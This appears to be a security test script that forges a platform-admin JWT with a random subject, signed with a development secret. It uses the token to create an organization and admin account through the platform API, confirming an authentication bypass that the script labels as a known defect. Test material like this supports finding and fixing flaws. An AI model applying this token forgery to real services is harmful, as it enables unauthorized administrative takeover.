async def main() -> None:
    print("== TC-PC-024 — FORGED platform token (random sub, dev secret) onboards an org (201) ==")
    async with _client() as c:
        # Forge a platform-aud token with a RANDOM sub on the dev secret. No real admin needed:
        # get_current_platform_admin verifies ONLY the token, never that the admin row exists.
        forged = forge_platform_token()  # sub = random uuid, aud='platform', DEV_SECRET
        print("[forge]   forged platform token w/ random sub on DEV_SECRET")

        # Forged token bypasses provision_company's auto-namespacing -> namespace MANUALLY.
        slug = f"xdom-forged-{stamp()}"
        admin_email = f"admin-{slug}@oneai.dev"
        onboard = await c.post(
            "/platform/orgs",
            headers=bearer(forged),
            json={
                "org_name": f"Org {slug}",
                "org_slug": slug,
                "admin_email": admin_email,
                "admin_full_name": "Forged Onboard Admin",
                "admin_password": DEFAULT_PW,
            },
        )
        print("[attack]  POST /platform/orgs (FORGED platform token):", onboard.status_code)
        body = onboard.json()
        print("          body:", body)

        ok = onboard.status_code == 201 and body.get("organization", {}).get("slug") == slug
        print("RESULT:", f"PASS (DEFECT-AS-DESIGNED) — forged dev-secret token created org slug={slug}"
              if ok else f"FAIL — expected 201 create, got {onboard.status_code}")
        print("CLEANUP-NOTE: org slug", slug, "left in DB (do not delete); run-stamped, isolated.")


asyncio.run(main())
